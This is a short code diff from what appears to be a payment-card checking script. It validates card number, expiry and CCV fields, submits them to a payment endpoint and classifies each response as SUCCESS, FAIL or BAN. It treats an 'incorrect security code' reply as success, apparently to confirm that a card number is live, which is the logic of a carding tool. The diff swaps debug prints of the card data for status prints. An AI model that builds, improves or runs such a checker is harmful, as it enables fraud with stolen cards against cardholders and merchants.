@@ -44,10 +44,6 @@ def init_input(ctx):
     expect.truthy(ctx.mm, "MM required")
     expect.truthy(ctx.yyyy, "YYYY required")
     expect.truthy(ctx.ccv, "CCV required")
-    print(f"DEBUG - CCNUM: {ctx.ccnum}")
-    print(f"DEBUG - MM: {ctx.mm}")
-    print(f"DEBUG - YYYY: {ctx.yyyy}")
-    print(f"DEBUG - CCV: {ctx.ccv}")
     try:
         nmm = int(ctx.mm); expect.ge(nmm, 1); expect.ge(12, nmm)
     except Exception:
@@ -492,8 +488,10 @@ def submit_phpl(ctx):
     ctx.raw = r.text()
     if ('AuthorizeResult":"Approved"' in t) or ("Your card's security code is incorrect" in t):
         ctx.status = "SUCCESS"
+        print(f"DEBUG - Matego status: {ctx.status}")
     elif ("ThreeDs2_Authentication_Exception" in t) or ("2Fcard_declined" in t) or ("transaction_not_allowed" in t) or ("Your card number is incorrect" in t):
         ctx.status = "FAIL"
+        print(f"DEBUG - Matego status: {ctx.status}")
     else:
         print(f"DEBUG - Matego body: {t}")
         ctx.status = "BAN"
